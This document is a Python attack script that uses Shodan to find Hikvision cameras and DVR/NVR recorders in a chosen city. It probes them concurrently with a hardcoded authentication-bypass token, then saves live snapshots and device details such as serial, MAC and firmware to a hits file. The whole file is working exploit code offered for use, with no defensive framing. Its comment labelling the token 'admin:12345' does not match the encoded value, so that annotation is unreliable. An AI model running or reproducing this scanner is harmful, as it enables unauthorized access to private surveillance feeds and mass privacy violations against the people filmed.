#!/usr/bin/env python3
# hikvision_city_hunter_2025_DVR_PURPLE.py
# DVRs & NVRs now scream in BEAUTIFUL PURPLE

import shodan
import requests
import os
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import xml.etree.ElementTree as ET

# ====================== CONFIG ======================
SHODAN_API_KEY = "not getting my key loser"
CITY = "new york"                                # ← Change city here
COUNTRY = ""                                   # Optional: "US", "CN", etc.

CONCURRENCY = 120
TIMEOUT = 10
HITS_FILE = f"HITS_{CITY}_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
os.makedirs("snapshots", exist_ok=True)

AUTH = "YWRtaW46MTEK"  # admin:12345

# COLORS — NOW WITH ROYAL PURPLE
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
RED     = "\033[91m"
PURPLE  = "\033[95m"   # <-- DVR/NVR color
RESET   = "\033[0m"
BOLD    = "\033[1m"

print(f"""
{GREEN}{BOLD}
╔══════════════════════════════════════════════════════════╗
║         HIKVISION 2025 ULTIMATE CITY HUNTER              ║
║         Target: {CITY:<18} | Key: admin:12345           ║
║         DVRs & NVRs = {PURPLE}PURPLE{RESET}{GREEN} | Cameras = Green        ║
║         Results → {HITS_FILE}                           ║
╚══════════════════════════════════════════════════════════╝{RESET}
""")

# ====================== Parse Device Info ======================
def parse_device_info(xml_text):
    try:
        root = ET.fromstring(xml_text)
        ns = {'ns': 'http://www.hikvision.com/ver10/XMLSchema'}
        info = {
            'model': root.find('.//ns:deviceType', ns).text if root.find('.//ns:deviceType', ns) is not None else "Unknown",
            'serial': root.find('.//ns:serialNumber', ns).text if root.find('.//ns:serialNumber', ns) is not None else "Unknown",
            'firmware': root.find('.//ns:firmwareVersion', ns).text if root.find('.//ns:firmwareVersion', ns) is not None else "Unknown",
            'mac': root.find('.//ns:macAddress', ns).text if root.find('.//ns:macAddress', ns) is not None else "Unknown",
            'device_name': root.find('.//ns:deviceName', ns).text if root.find('.//ns:deviceName', ns) is not None else "Unknown",
        }
        return info
    except:
        return None

# ====================== Check & Exploit ======================
def check_target(ip, port, location):
    ip_port = f"{ip}:{port}"
    city_name = location.get('city') or "Unknown"
    country = location.get('country_name') or "??"

    print(f"[CHECK] {ip_port:21} | {city_name:18} {country}")

    for scheme in ["http", "https"]:
        base = f"{scheme}://{ip_port}"
        try:
            url = f"{base}/System/deviceInfo?auth={AUTH}"
            r = requests.get(url, timeout=TIMEOUT, verify=False, headers={"User-Agent": "Mozilla/5.0"})

            if r.status_code == 200 and ("deviceType" in r.text or "serialNumber" in r.text):
                info = parse_device_info(r.text) or {}
                model = info.get('model', 'Unknown Model').upper()
                serial = info.get('serial', 'Unknown')
                firmware = info.get('firmware', 'Unknown')
                mac = info.get('mac', 'Unknown')
                dev_name = info.get('device_name', 'No Name')

                # Detect DVR/NVR vs Camera
                is_dvr_nvr = any(x in model for x in ["72", "73", "76", "77", "90", "96", "71", "78", "79", "86", "88", "95"])
                hit_color = PURPLE if is_dvr_nvr else GREEN
                type_label = "DVR/NVR" if is_dvr_nvr else "CAMERA"

                print(f"\n{YELLOW}{'='*88}")
                print(f"{hit_color}{BOLD}██ {type_label} JACKPOT ██{RESET}")
                print(f"{CYAN}  IP        : {BOLD}{ip_port}{RESET}")
                print(f"{CYAN}  Location  : {BOLD}{city_name}, {country}{RESET}")
                print(f"{CYAN}  Type      : {BOLD}{type_label}{RESET}")
                print(f"{CYAN}  Model     : {BOLD}{model}{RESET}")
                print(f"{CYAN}  Serial    : {BOLD}{serial}{RESET}")
                print(f"{CYAN}  Firmware  : {BOLD}{firmware}{RESET}")
                print(f"{CYAN}  MAC       : {BOLD}{mac}{RESET}")
                print(f"{CYAN}  Name      : {BOLD}{dev_name}{RESET}")
                print(f"{CYAN}  Login     : {BOLD}admin:12345{RESET}")
                print(f"{CYAN}  Snapshot  : {base}/onvif-http/snapshot?auth={AUTH}")

                # Save snapshot (DVRs usually have at least one channel)
                try:
                    snap = requests.get(f"{base}/onvif-http/snapshot?auth={AUTH}", timeout=8, verify=False)
                    if len(snap.content) > 8000:
                        prefix = "DVR" if is_dvr_nvr else "CAM"
                        fn = f"snapshots/{prefix}_{ip_port.replace(':', '_')}_{serial[-6:] if serial != 'Unknown' else 'dev'}.jpg"
                        open(fn, "wb").write(snap.content)
                        print(f"{hit_color}  Snapshot saved → {fn}{RESET}")
                except:
                    pass

                # Save to file
                hit_entry = (
                    f"{ip_port} | {city_name}, {country} | {type_label} | "
                    f"{model} | {serial} | {firmware} | {mac} | admin:12345 | "
                    f"{base}/onvif-http/snapshot?auth={AUTH}"
                )
                with open(HITS_FILE, "a") as f:
                    f.write(hit_entry + "\n")

                print(f"{YELLOW}{'='*88}{RESET}\n")
                return hit_entry

        except:
            continue
    return None

# ====================== Shodan Search ======================
api = shodan.Shodan(SHODAN_API_KEY)
query = f'hikvision city:"{CITY}"' + (f' country:"{COUNTRY}"' if COUNTRY else '')

print(f"{YELLOW}[+] Searching: {query}{RESET}\n")
targets = []

try:
    page = 1
    while True:
        res = api.search(query, page=page)
        for match in res['matches']:
            if len(match.get('ports', [])) > 12:
                continue
            ip = match['ip_str']
            port = match['port']
            loc = match.get('location', {})
            targets.append((ip, port, loc))
        if len(res['matches']) < 100:
            break
        page += 1
        time.sleep(1.1)

except shodan.APIError as e:
    print(f"{RED}[!] Shodan Error: {e}{RESET}")
    exit()

print(f"{GREEN}[+] Loaded {len(targets)} targets in {CITY} (honeypots removed){RESET}\n")
print(f"{BOLD}Starting live hunt...{RESET}\n")

# ====================== GO ======================
hit_count = 0
with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
    futures = [ex.submit(check_target, ip, port, loc) for ip, port, loc in targets]
    for f in as_completed(futures):
        if f.result():
            hit_count += 1

print(f"\n{GREEN}{BOLD}HUNT COMPLETE!{RESET}")
print(f"   Total vulnerable devices in {CITY}: {hit_count}")
print(f"   All hits (with DVRs in purple) → {HITS_FILE}")
print(f"   Snapshots → snapshots/ folder")
if hit_count > 0:
    print(f"\n{YELLOW}Latest hits:{RESET}")
    os.system(f"tail -10 '{HITS_FILE}'")
